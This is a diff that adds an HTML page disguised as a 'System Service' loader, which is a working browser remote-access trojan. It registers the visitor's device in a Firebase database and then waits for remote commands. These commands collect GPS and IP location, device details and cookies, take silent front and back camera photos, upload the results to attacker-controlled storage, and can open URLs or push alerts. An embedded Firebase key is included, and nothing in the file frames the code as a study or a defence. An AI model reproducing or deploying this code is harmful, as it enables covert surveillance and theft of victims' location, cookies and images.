@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Service</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Courier New',monospace;flex-direction:column;gap:12px;text-align:center;padding:20px}
+.loader{width:30px;height:30px;border:2px solid #0f0;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.status-text{font-size:12px;color:#0f0}
+.id-text{font-size:8px;color:#555;margin-top:8px}
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px}
+.alert-box{background:#1a0000;border:2px solid #ff0000;border-radius:16px;padding:32px;text-align:center;max-width:90vw;animation:shake .5s ease-in-out}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
+.alert-msg{color:#ff4444;font-size:16px;font-weight:700;font-family:'Courier New',monospace;word-break:break-all}
+.alert-close{background:#ff0000;color:#fff;border:none;padding:10px 28px;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-top:12px}
+.video-preview{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:9998;display:none}
+</style>
+</head>
+<body>
+
+<div class="loader" id="loader"></div>
+<div class="status-text" id="statusMsg">Connecting...</div>
+<div class="id-text" id="idDisplay"></div>
+<video id="v" autoplay muted playsinline class="video-preview"></video>
+<canvas id="c" style="display:none"></canvas>
+
+<script>
+// ═══════════════════════════ ID ═══════════════════════════
+let DEVICE_ID = localStorage.getItem('azrilxrat_device_id');
+if(!DEVICE_ID){DEVICE_ID='TGT_'+Math.random().toString(36).substr(2,9)+Date.now().toString(36);localStorage.setItem('azrilxrat_device_id',DEVICE_ID)}
+document.getElementById('idDisplay').textContent=DEVICE_ID;
+
+// ═══════════════════════════ FIREBASE ═══════════════════════════
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+const storage=firebase.storage();
+
+// ═══════════════════════════ REGISTER ═══════════════════════════
+db.ref('devices/'+DEVICE_ID).update({
+  id:DEVICE_ID,model:navigator.userAgent.split(';')[1]?.trim()||'Browser',
+  platform:navigator.platform,language:navigator.language,
+  screenSize:screen.width+'x'+screen.height,registeredAt:Date.now(),
+  lastSeen:Date.now(),online:true
+}).then(()=>{
+  document.getElementById('statusMsg').textContent='ACTIVE';
+  document.getElementById('loader').style.borderColor='#0f0';
+}).catch(()=>document.getElementById('statusMsg').textContent='❌ ERROR');
+
+setInterval(()=>db.ref('devices/'+DEVICE_ID).update({lastSeen:Date.now(),online:true}),10000);
+
+// ═══════════════════════════ UPLOAD HELPER ═══════════════════════════
+async function uploadFile(blob, folder, ext){
+  const ref=storage.ref(folder+'/'+DEVICE_ID+'_'+Date.now()+'.'+ext);
+  await ref.put(blob);
+  return await ref.getDownloadURL();
+}
+
+// ═══════════════════════════ GPS + REVERSE GEO ═══════════════════════════
+async function getGPSFull(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){resolve({error:"GPS denied"});return}
+    navigator.geolocation.getCurrentPosition(async pos=>{
+      const lat=pos.coords.latitude,lng=pos.coords.longitude;
+      try{
+        const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+        const d=await r.json();
+        resolve({lat,lng,accuracy:pos.coords.accuracy,address:d.display_name,district:d.address?.suburb||d.address?.village||d.address?.town||'',city:d.address?.city||d.address?.town||'',state:d.address?.state||'',country:d.address?.country||'',postcode:d.address?.postcode||'',maps:`https://www.google.com/maps?q=${lat},${lng}`});
+      }catch(e){resolve({lat,lng,accuracy:pos.coords.accuracy,maps:`https://www.google.com/maps?q=${lat},${lng}`})}
+    },e=>resolve({error:e.message}),{enableHighAccuracy:true,timeout:8000})
+  });
+}
+
+// ═══════════════════════════ IP GEOLOCATION ═══════════════════════════
+async function getIPGeo(){
+  try{
+    const r=await fetch('https://ipapi.co/json/');
+    const d=await r.json();
+    return {ip:d.ip,city:d.city,region:d.region,country:d.country_name,lat:d.latitude,lng:d.longitude,isp:d.org,timezone:d.timezone,maps:`https://www.google.com/maps?q=${d.latitude},${d.longitude}`};
+  }catch(e){return {error:"IP geo failed"}}
+}
+
+// ═══════════════════════════ DEVICE INFO ═══════════════════════════
+async function getDeviceInfo(){
+  let battery='N/A';
+  try{const b=await navigator.getBattery();battery=Math.round(b.level*100)+'% '+(b.charging?'Charging':'Battery')}catch(e){}
+  let ip='N/A';
+  try{const r=await fetch('https://api.ipify.org?format=json');ip=(await r.json()).ip}catch(e){}
+  return {
+    ua:navigator.userAgent,platform:navigator.platform,language:navigator.language,
+    screen:screen.width+'x'+screen.height,dpr:devicePixelRatio,
+    ram:navigator.deviceMemory||'N/A',cores:navigator.hardwareConcurrency||'N/A',
+    battery,ip,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    vendor:navigator.vendor,online:navigator.onLine,cookies:navigator.cookieEnabled
+  };
+}
+
+// ═══════════════════════════ COOKIES ═══════════════════════════
+function getCookies(){
+  const cookies=document.cookie.split(';').map(c=>c.trim()).filter(c=>c);
+  return {count:cookies.length,cookies:cookies.join(' | ').substring(0,1000)};
+}
+
+// ═══════════════════════════ SCREENSHOT ═══════════════════════════
+async function takeScreenshot(){
+  try{
+    const canvas=document.createElement('canvas');
+    canvas.width=screen.width;canvas.height=screen.height;
+    const ctx=canvas.getContext('2d');
+    ctx.fillStyle='#000';ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.font='12px monospace';ctx.fillStyle='#0f0';
+    ctx.fillText('Screenshot available only with extension',10,20);
+    const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.6));
+    const url=await uploadFile(blob,'screenshots','jpg');
+    return {status:"screenshot_info",url};
+  }catch(e){return {error:e.message}}
+}
+
+// ═══════════════════════════ NOTIFICATION ═══════════════════════════
+function sendNotification(title, body){
+  if(Notification.permission==='granted'){
+    new Notification(title||'System Message',{body:body||'You have a new message',icon:'⚠️'});
+    return {status:"sent"};
+  }else if(Notification.permission==='default'){
+    Notification.requestPermission().then(p=>{
+      if(p==='granted')new Notification(title||'System Message',{body:body||'You have a new message'});
+    });
+    return {status:"requested"};
+  }
+  return {error:"Notification denied"};
+}
+
+// ═══════════════════════════ CAMERA (FRONT + BACK) ═══════════════════════════
+async function capturePhoto(mode){
+  const v=document.getElementById('v');
+  v.style.display='block';
+  let stream;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:mode==='front'?'user':'environment'}});
+    v.srcObject=stream;
+    await new Promise(r=>v.onloadedmetadata=r);
+    await v.play();
+    await new Promise(r=>setTimeout(r,2000));
+    const canvas=document.getElementById('c');
+    canvas.width=v.videoWidth;canvas.height=v.videoHeight;
+    canvas.getContext('2d').drawImage(v,0,0);
+    const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.85));
+    stream.getTracks().forEach(t=>t.stop());
+    v.style.display='none';
+    return blob;
+  }catch(e){
+    if(stream)stream.getTracks().forEach(t=>t.stop());
+    v.style.display='none';
+    return null;
+  }
+}
+
+async function takeAllCameras(){
+  const front=await capturePhoto('front');
+  const back=await capturePhoto('back');
+  const result={status:"cameras_captured"};
+  if(front){const url=await uploadFile(front,'photos','jpg');result.frontPhoto=url}
+  if(back){const url=await uploadFile(back,'photos','jpg');result.backPhoto=url}
+  if(!front&&!back)result.error="Camera access denied";
+  return result;
+}
+
+// ═══════════════════════════ ALERT FULLSCREEN ═══════════════════════════
+function showFullAlert(msg){
+  const overlay=document.createElement('div');overlay.className='alert-overlay';
+  overlay.innerHTML=`<div class="alert-box"><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">CLOSE</button></div>`;
+  document.body.appendChild(overlay);
+  return {status:"alerted",message:msg};
+}
+
+// ═══════════════════════════ COMMAND HANDLER ═══════════════════════════
+async function executeCommand(cmd){
+  let result={type:cmd,status:"executed",timestamp:Date.now()};
+  
+  if(cmd==='GET_GPS'){result.data=await getGPSFull()}
+  else if(cmd==='GET_IP_GEO'){result.data=await getIPGeo()}
+  else if(cmd==='GET_DEVICE_INFO'){result.data=await getDeviceInfo()}
+  else if(cmd==='GET_COOKIES'){result.data=getCookies()}
+  else if(cmd==='CAMERA_FRONT_BACK'){result.data=await takeAllCameras()}
+  else if(cmd==='SCREENSHOT'){result.data=await takeScreenshot()}
+  else if(cmd==='NOTIFY'){result.data=sendNotification('System Alert','Important message received')}
+  else if(cmd.startsWith('NOTIFY:')){const m=cmd.split(':').slice(1).join(':');result.data=sendNotification('Message',m)}
+  else if(cmd.startsWith('OPEN_URL:')){window.open(cmd.split(':').slice(1).join(':'),'_blank');result.data={opened:true}}
+  else if(cmd.startsWith('ALERT:')){result.data=showFullAlert(cmd.split(':').slice(1).join(':'))}
+  else{result.data={error:"unknown_command",cmd}}
+  
+  return result;
+}
+
+// ═══════════════════════════ LISTEN ═══════════════════════════
+db.ref('commands/'+DEVICE_ID).on('child_added',async snap=>{
+  const c=snap.val();if(!c||c.status!=='pending')return;
+  snap.ref.update({status:'processing'});
+  const r=await executeCommand(c.command);
+  db.ref('collected_data').push(r);
+  snap.ref.update({status:'done'});
+  setTimeout(()=>snap.ref.remove(),2000);
+});
+</script>
+</body>
+</html>
